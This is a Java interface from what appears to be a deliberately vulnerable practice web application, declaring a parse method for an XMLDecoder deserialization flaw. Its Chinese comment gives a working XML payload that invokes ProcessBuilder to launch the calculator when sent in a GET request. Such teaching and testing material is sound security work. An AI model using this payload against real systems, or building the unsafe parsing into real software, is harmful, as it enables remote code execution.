package cn.bestsec.vulweb.service;

/**
 * XMLDecoder反序列化漏洞代码
 * @author hjxin
 * @since 2023/12/6
 * payload: <java>
 *     <object class="java.lang.ProcessBuilder">
 *         <array class="java.lang.String" length="1" >
 *             <void index="0">
 *                 <string>calc</string>
 *             </void>
 *         </array>
 *         <void method="start"/>
 *     </object>
 * </java>
 * 通过get请求发送上述xml文本，会唤起本机计算器
 */
public interface XMLDecoderVul {
    String parse(String document);
}
